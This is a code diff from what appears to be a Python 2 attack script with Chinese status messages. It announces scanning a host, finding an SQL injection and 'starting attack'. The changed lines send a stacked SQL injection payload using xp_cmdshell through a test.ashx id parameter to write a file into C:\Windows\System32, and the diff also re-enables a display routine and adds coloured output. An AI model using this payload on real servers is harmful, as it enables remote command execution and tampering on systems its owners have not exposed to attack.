@@ -110,7 +110,7 @@ def del_file(host):
     center_print ("开始尝试替换用户桌面")
     time.sleep(3)
     try:
-        del_data="1; exec ..xp_cmdshell 'echo 1 > c:\Windows\System32\lala.txt'"
+        del_data="1; exec ..xp_cmdshell 'echo 1 > c:\Windows\System32\lalala.txt'"
         full_url="http://"+host+"/test.ashx?id="+urllib.quote(del_data)
         #print full_url
         html=urllib2.urlopen(full_url)
@@ -164,12 +164,13 @@ def scan_port_os(host):
     time.sleep(2)
     center_print ("是否为windows")
     time.sleep(2)
-    center_print ("检测系统成功，系统为:windows")
+    center_print (""+ Fore.GREEN + Style.BRIGHT+"检测系统成功，系统为:windows")
+    print "" + Fore.RESET + Style.RESET_ALL
     center_print ("检测漏洞")
     crawl(host)
     center_print ("发现有sql注入漏洞，开始攻击")
     time.sleep(5)
-    #cool_show()
+    cool_show()
 
 def cool_show():
     f = open("/bin/bash", 'rb')
